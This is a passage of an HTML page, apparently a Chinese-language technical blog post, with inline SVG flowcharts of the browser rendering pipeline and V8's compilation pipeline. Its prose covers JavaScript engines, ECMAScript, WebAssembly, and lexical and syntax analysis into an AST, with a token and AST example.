d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1094" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1095" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1098" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1099" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1102" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1103" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1112" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1113" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1116" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1117" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1120" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1121" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1124" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1125" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker></defs><g id="SvgjsG1008" transform="translate(25,143)"><path id="SvgjsPath1009" d="M 0 61.666666666666664L 0 0L 100 0L 100 61.666666666666664Q 75 45 50 61.666666666666664Q 25 78.33333333333333 0 61.666666666666664Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1010"><text id="SvgjsText1011" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="100px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="20.875" transform="rotate(0)"><tspan id="SvgjsTspan1012" dy="16" x="50"><tspan id="SvgjsTspan1013" style="text-decoration:;">HTML</tspan></tspan></text></g></g><g id="SvgjsG1014" transform="translate(204,143)"><path id="SvgjsPath1015" d="M 0 0L 100 0L 100 70L 0 70Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1016"><text id="SvgjsText1017" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="80px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="24.375" transform="rotate(0)"><tspan id="SvgjsTspan1018" dy="16" x="50"><tspan id="SvgjsTspan1019" style="text-decoration:;">HTML Parser</tspan></tspan></text></g></g><g id="SvgjsG1020" transform="translate(383,143)"><path id="SvgjsPath1021" d="M 23.333333333333332 0L 100 0L 76.66666666666667 70L 0 70L 23.333333333333332 0Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1022"><text id="SvgjsText1023" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="70px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="24.375" transform="rotate(0)"><tspan id="SvgjsTspan1024" dy="16" x="50"><tspan id="SvgjsTspan1025" style="text-decoration:;">DOM Tree</tspan></tspan></text></g></g><g id="SvgjsG1026" transform="translate(383,261)"><path id="SvgjsPath1027" d="M 0 0L 100 0L 100 70L 0 70Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1028"><text id="SvgjsText1029" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="80px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="24.375" transform="rotate(0)"><tspan id="SvgjsTspan1030" dy="16" x="50"><tspan id="SvgjsTspan1031" style="text-decoration:;">Attachment</tspan></tspan></text></g></g><g id="SvgjsG1032" transform="translate(383,379)"><path id="SvgjsPath1033" d="M 23.333333333333332 0L 100 0L 76.66666666666667 70L 0 70L 23.333333333333332 0Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1034"><text id="SvgjsText1035" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="70px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="24.375" transform="rotate(0)"><tspan id="SvgjsTspan1036" dy="16" x="50"><tspan id="SvgjsTspan1037" style="text-decoration:;">Style Rules</tspan></tspan></text></g></g><g id="SvgjsG1038" transform="translate(204,379)"><path id="SvgjsPath1039" d="M 0 0L 100 0L 100 70L 0 70Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1040"><text id="SvgjsText1041" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="80px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="24.375" transform="rotate(0)"><tspan id="SvgjsTspan1042" dy="16" x="50"><tspan id="SvgjsTspan1043" style="text-decoration:;">CSS Parser</tspan></tspan></text></g></g><g id="SvgjsG1044" transform="translate(25,379)"><path id="SvgjsPath1045" d="M 0 61.666666666666664L 0 0L 100 0L 100 61.666666666666664Q 75 45 50 61.666666666666664Q 25 78.33333333333333 0 61.666666666666664Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1046"><text id="SvgjsText1047" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="100px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="20.875" transform="rotate(0)"><tspan id="SvgjsTspan1048" dy="16" x="50"><tspan id="SvgjsTspan1049" style="text-decoration:;">CSS</tspan></tspan></text></g></g><g id="SvgjsG1050" transform="translate(564,256)"><path id="SvgjsPath1051" d="M 23.333333333333332 0L 100 0L 76.66666666666667 70L 0 70L 23.333333333333332 0Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1052"><text id="SvgjsText1053" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="70px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="15.875" transform="rotate(0)"><tspan id="SvgjsTspan1054" dy="16" x="50"><tspan id="SvgjsTspan1055" style="text-decoration:;">Render</tspan></tspan><tspan id="SvgjsTspan1056" dy="16" x="50"><tspan id="SvgjsTspan1057" style="text-decoration:;">Tree</tspan></tspan></text></g></g><g id="SvgjsG1058" transform="translate(564,143)"><path id="SvgjsPath1059" d="M 0 0L 100 0L 100 70L 0 70Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1060"><text id="SvgjsText1061" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="80px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="24.375" transform="rotate(0)"><tspan id="SvgjsTspan1062" dy="16" x="50"><tspan id="SvgjsTspan1063" style="text-decoration:;">Layout</tspan></tspan></text></g></g><g id="SvgjsG1064" transform="translate(745,256)"><path id="SvgjsPath1065" d="M 0 0L 100 0L 100 70L 0 70Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1066"><text id="SvgjsText1067" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="80px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="24.375" transform="rotate(0)"><tspan id="SvgjsTspan1068" dy="16" x="50"><tspan id="SvgjsTspan1069" style="text-decoration:;">Painting</tspan></tspan></text></g></g><g id="SvgjsG1070" transform="translate(926,266)"><path id="SvgjsPath1071" d="M 16.666666666666668 0L 83.33333333333333 0C 105.55555555555556 0 105.55555555555556 50 83.33333333333333 50L 16.666666666666668 50C -5.555555555555556 50 -5.555555555555556 0 16.666666666666668 0Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1072"><text id="SvgjsText1073" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="80px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="14.375" transform="rotate(0)"><tspan id="SvgjsTspan1074" dy="16" x="50"><tspan id="SvgjsTspan1075" style="text-decoration:;">Display</tspan></tspan></text></g></g><g id="SvgjsG1076"><path id="SvgjsPath1077" d="M126 178L164.5 178L164.5 178L200.39999999999998 178" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1078)"/></g><g id="SvgjsG1080"><path id="SvgjsPath1081" d="M126 414L164.5 414L164.5 414L200.39999999999998 414" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1082)"/></g><g id="SvgjsG1084"><path id="SvgjsPath1085" d="M305 178L349.33333333333337 178L349.33333333333337 178L391.06666666666666 178" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1086)"/></g><g id="SvgjsG1088"><path id="SvgjsPath1089" d="M305 414L349.33333333333337 414L349.33333333333337 414L391.06666666666666 414" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1090)"/></g><g id="SvgjsG1092"><path id="SvgjsPath1093" d="M484 296L528.8807403920117 296L528.8807403920117 295.8117333157177L571.1614807840234 295.8117333157177" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1094)"/></g><g id="SvgjsG1096"><path id="SvgjsPath1097" d="M653.3333333333334 291L698.6666666666667 291L698.6666666666667 291L741.4 291" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1098)"/></g><g id="SvgjsG1100"><path id="SvgjsPath1101" d="M846 291L885.5 291L885.5 291L922.4 291" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1102)"/></g><g id="SvgjsG1104" transform="translate(383,25)"><path id="SvgjsPath1105" d="M 0 0L 100 0L 100 70L 0 70Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1106"><text id="SvgjsText1107" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="80px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="24.375" transform="rotate(0)"><tspan id="SvgjsTspan1108" dy="16" x="50"><tspan id="SvgjsTspan1109" style="text-decoration:;">DOM</tspan></tspan></text></g></g><g id="SvgjsG1110"><path id="SvgjsPath1111" d="M433 96L433 119L433 119L433 139.4" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1112)"/></g><g id="SvgjsG1114"><path id="SvgjsPath1115" d="M433 214L433 237L433 237L433 257.4" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1116)"/></g><g id="SvgjsG1118"><path id="SvgjsPath1119" d="M433 378L433 355L433 355L433 334.6" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1120)"/></g><g id="SvgjsG1122"><path id="SvgjsPath1123" d="M614 214L614 234.5L614 234.5L614 252.39999999999998" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1124)"/></g></svg>
</div>
<h3 id="javascript-engine">JavaScript Engine</h3>
<p>&#x9AD8;&#x7EA7;&#x7684;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x6700;&#x7EC8;&#x90FD;&#x662F;&#x9700;&#x8981;&#x8F6C;&#x6210;&#x673A;&#x5668;&#x6307;&#x4EE4;&#x6765;&#x6267;&#x884C;&#x7684;&#x3002;JavaScript &#x65E0;&#x8BBA;&#x662F;&#x4EA4;&#x7ED9;&#x6D4F;&#x89C8;&#x5668;&#x8FD8;&#x662F; Node.JS&#xFF0C;&#x6700;&#x540E;&#x90FD;&#x662F;&#x9700;&#x8981;&#x53EA;&#x8BA4;&#x8BC6;&#x673A;&#x5668;&#x8BED;&#x8A00;&#x6307;&#x4EE4;&#x96C6;&#x7684; CPU &#x6267;&#x884C;&#x3002;&#x6240;&#x4EE5;&#x9700;&#x8981; JS &#x5F15;&#x64CE;&#x5E2E;&#x52A9;&#x5C06; JavaScript &#x4EE3;&#x7801;&#x7FFB;&#x8BD1;&#x6210; CPU &#x6307;&#x4EE4;&#x8FDB;&#x884C;&#x6267;&#x884C;&#x3002;</p>
<blockquote>
<p>=&gt; &#x5E38;&#x89C1; JavaScript Engine<br>
SpiderMonkey =&gt; The first JavaScript engine &amp; Developed by Brendan Eich<br>
Chakra =&gt; &#x5FAE;&#x8F6F;&#x5F00;&#x53D1;&#x5E76;&#x7528;&#x4E8E; IE &#x6D4F;&#x89C8;&#x5668;<br>
JavaScriptCore =&gt; Apple &#x5F00;&#x53D1;&#x5E76;&#x7528;&#x4E8E; WebKit<br>
v8 =&gt; Google &#x5F00;&#x53D1;&#x7528;&#x4E8E; Chromium</p>
</blockquote>
<h3 id="v8-%E5%BC%95%E6%93%8E%E5%8E%9F%E7%90%86">V8 &#x5F15;&#x64CE;&#x539F;&#x7406;</h3>
<p>C++ &#x7F16;&#x5199;&#x7684; <a href="https://v8.dev/">V8 engine</a> &#x7531; Google &#x5F00;&#x6E90;&#xFF0C;&#x662F;&#x9AD8;&#x6027;&#x80FD; JS &#x548C; WebAssembly &#x5F15;&#x64CE;&#xFF0C;&#x7528;&#x4E8E; Chrome &#x548C; Node &#x7B49;&#x3002;V8 &#x53EF;&#x4EE5;&#x72EC;&#x7ACB;&#x8FD0;&#x884C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5D4C;&#x5165;&#x5230;&#x4EFB;&#x4F55; C++ &#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#x3002;</p>
<blockquote>
<p>V8 engine implements ECMAScript and WebAssembly, and runs on Windows 7 or later, macOS 10.12+, and Linux systems that use x64, IA-32, ARM, or MIPS processors.</p>
<ul>
<li>ECMAScript is a Standard for scripting languages such as JavaScript, JScript, etc. It is a trademark scripting language specification. JavaScript is a language based on ECMAScript. A standard for scripting languages like JavaScript, JScript is ECMAScript.</li>
<li>WebAssembly (abbreviated Wasm) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable compilation target for programming languages, enabling deployment on the web for client and server applications.</li>
</ul>
</blockquote>
<p>JS &#x7ECF;&#x8FC7;<a href="https://esprima.org/">&#x8BCD;&#x6CD5;&#x5206;&#x6790;</a>&#x751F;&#x6210;&#x7531; type &#x4E0E; value &#x7EC4;&#x6210;&#x7684;&#x5BF9;&#x8C61;&#x5E76;&#x5B58;&#x50A8;&#x5728; tokens &#x6570;&#x7EC4;&#x3002;&#x968F;&#x540E;&#x7684;&#x8BED;&#x6CD5;&#x5206;&#x6790;&#x751F;&#x6210; <a href="https://astexplorer.net/">AST</a> &#x62BD;&#x8C61;&#x8BED;&#x6CD5;&#x6811;&#x3002;</p>
<p>&#x7C7B;&#x4F3C; Babel &#x5C06; TS &#x8F6C;&#x4E3A; JS&#xFF0C;&#x4E5F;&#x662F;&#x5148;&#x751F;&#x6210; Abstract Syntax Tree &#x5E76;&#x4F5C;&#x51FA;&#x76F8;&#x5E94;&#x4FEE;&#x6539;&#xFF0C;&#x4EA7;&#x751F; new Abstract Syntax Tree&#xFF0C;&#x518D; generate code &#x4E3A; JS&#x3002;</p>
<p>&#x540C;&#x7406; Vue &#x4E2D; Template &#x4E5F;&#x662F;&#x5148;&#x8F6C;&#x6362;&#x6210; Abstract Syntax Tree &#x518D; CreateVNode &#x865A;&#x62DF;&#x8282;&#x70B9;&#xFF0C;&#x6700;&#x540E;&#x4EA7;&#x751F; JS&#x3002;</p>
<pre><code class="language-js">const name = &apos;zs&apos;
/* &#x8BCD;&#x6CD5;&#x5206;&#x6790; */
[
  { type: &apos;Keyword&apos;, value: &apos;const&apos; },
  { type: &apos;Identifier&apos;, value: &apos;name&apos; },
  { type: &apos;Punctuator&apos;, value: &apos;=&apos; },
  { type: &apos;String&apos;, value: &quot;&apos;zs&apos;&quot; }
]

/* &#x8BED;&#x6CD5;&#x5206;&#x6790; */
{
  &quot;type&quot;: &quot;Program&quot;,
  &quot;start&quot;: 0,
  &quot;end&quot;: 17,
  &quot;body&quot;: [
    {
      &quot;type&quot;: &quot;VariableDeclaration&quot;,
      &quot;start&quot;: 0,
      &quot;end&quot;: 17,
      &quot;declarations&quot;: [
        {
          &quot;type&quot;: &quot;VariableDeclarator&quot;,
          &quot;start&quot;: 6,
          &quot;end&quot;: 17,
          &quot;id&quot;: {
            &quot;type&quot;: &quot;Identifier&quot;,
            &quot;start&quot;: 6,
            &quot;end&quot;: 10,
            &quot;name&quot;: &quot;name&quot;
          },
          &quot;init&quot;: {
            &quot;type&quot;: &quot;Literal&quot;,
            &quot;start&quot;: 13,
            &quot;end&quot;: 17,
            &quot;value&quot;: &quot;zs&quot;,
            &quot;raw&quot;: &quot;&apos;zs&apos;&quot;
          }
        }
      ],
      &quot;kind&quot;: &quot;const&quot;
    }
  ],
  &quot;sourceType&quot;: &quot;module&quot;
}
</code></pre>
<div style="overflow:scroll">
<svg id="SvgjsSvg1006" width="1097" height="426" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.com/svgjs"><defs id="SvgjsDefs1007"><marker id="SvgjsMarker1060" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1061" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1064" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1065" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1068" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1069" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1072" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1073" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1076" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1077" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1080" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1081" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1084" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1085" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1088" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1089" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1092" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1093" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1108" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1109" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker></defs><g id="SvgjsG1008" transform="translate(25,81)"><path id="SvgjsPath1009" d="M 0 4Q 0 0 4 0L 96 0Q 100 0 100 4L 100 66Q 100 70 96 70L 4 70Q 0 70 0 66Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1010"><text id="SvgjsText1011" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="80px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="24.375" transform="rotate(0)"><tspan id="SvgjsTspan1012" dy="16" x="50"><tspan id="SvgjsTspan1013" style="text-decoration:;">JS &#x6E90;&#x4EE3;&#x7801;</tspan></tspan></text></g></g><g id="SvgjsG1014" transform="translate(214,81)"><path id="SvgjsPath1015" d="M 23.333333333333332 0L 100 0L 76.66666666666667 70L 0 70L 23.333333333333332 0Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1016"><text id="SvgjsText1017" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="70px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="24.375" transform="rotate(0)"><tspan id="SvgjsTspan1018" dy="16" x="50"><tspan id="SvgjsTspan1019" style="text-decoration:;">Parse</tspan></tspan></text></g></g><g id="SvgjsG1020" transform="translate(403,81)"><path id="SvgjsPath1021" d="M 0 4Q 0 0 4 0L 96 0Q 100 0 100 4L 100 66Q 100 70 96 70L 4 70Q 0 70 0 66Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1022"><text id="SvgjsText1023" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="80px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="15.875" transform="rotate(0)"><tspan id="SvgjsTspan1024" dy="16" x="50"><tspan id="SvgjsTspan1025" style="text-decoration:;">AST</tspan></tspan><tspan id="SvgjsTspan1026" dy="16" x="50"><tspan id="SvgjsTspan1027" style="text-decoration:;">&#x62BD;&#x8C61;&#x8BED;&#x6CD5;&#x6811;</tspan></tspan></text></g></g><g id="SvgjsG1028" transform="translate(592,81)"><path id="SvgjsPath1029" d="M 23.333333333333332 0L 100 0L 76.66666666666667 70L 0 70L 23.333333333333332 0Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1030"><text id="SvgjsText1031" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="70px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="24.375" transform="rotate(0)"><tspan id="SvgjsTspan1032" dy="16" x="50"><tspan id="SvgjsTspan1033" style="text-decoration:;">Ignition</tspan></tspan></text></g></g><g id="SvgjsG1034" transform="translate(592,331)"><path id="SvgjsPath1035" d="M 23.333333333333332 0L 100 0L 76.66666666666667 70L 0 70L 23.333333333333332 0Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1036"><text id="SvgjsText1037" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="70px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="24.375" transform="rotate(0)"><tspan id="SvgjsTspan1038" dy="16" x="50"><tspan id="SvgjsTspan1039" style="text-decoration:;">TurboFan</tspan></tspan></text></g></g><g id="SvgjsG1040" transform="translate(781,81)"><path id="SvgjsPath1041" d="M 0 4Q 0 0 4 0L 96 0Q 100 0 100 4L 100 66Q 100 70 96 70L 4 70Q 0 70 0 66Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1042"><text id="SvgjsText1043" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="80px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="15.875" transform="rotate(0)"><tspan id="SvgjsTspan1044" dy="16" x="50"><tspan id="SvgjsTspan1045" style="text-decoration:;">bytecode</tspan></tspan><tspan id="SvgjsTspan1046" dy="16" x="50"><tspan id="SvgjsTspan1047" style="text-decoration:;">&#x5B57;&#x8282;&#x7801;</tspan></tspan></text></g></g><g id="SvgjsG1048" transform="translate(781,331)"><path id="SvgjsPath1049" d="M 0 4Q 0 0 4 0L 96 0Q 100 0 100 4L 100 66Q 100 70 96 70L 4 70Q 0 70 0 66Z" stroke="rgba(50,50,50,1)" stroke-width="2" fill-opacity="1" fill="#ffffff"/><g id="SvgjsG1050"><text id="SvgjsText1051" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="80px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="7.875" transform="rotate(0)"><tspan id="SvgjsTspan1052" dy="16" x="50"><tspan id="SvgjsTspan1053" style="text-decoration:;">Machine</tspan></tspan><tspan id="SvgjsTspan1054" dy="16" x="50"><tspan id="SvgjsTspan1055" style="text-decoration:;">Code&#x4F18;&#x5316;&#x7684;</tspan></tspan><tspan id="SvgjsTspan1056" dy="16" x="50"><tspan id="SvgjsTspan1057" style="text-decoration:;">&#x673A;&#x5668;&#x7801;</tspan></tspan></text></g></g><g id="SvgjsG1058"><path id="SvgjsPath1059" d="M126 116L175.33333333333337 116L175.33333333333337 116L222.06666666666666 116" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1060)"/></g><g id="SvgjsG1062"><path id="SvgjsPath1063" d="M303.3333333333333 116L352.66666666666663 116L352.66666666666663 116L399.4 116" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1064)"/></g><g id="SvgjsG1066"><path id="SvgjsPath1067" d="M504 116L553.3333333333333 116L553.3333333333333 116L600.0666666666666 116" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1068)"/></g><g 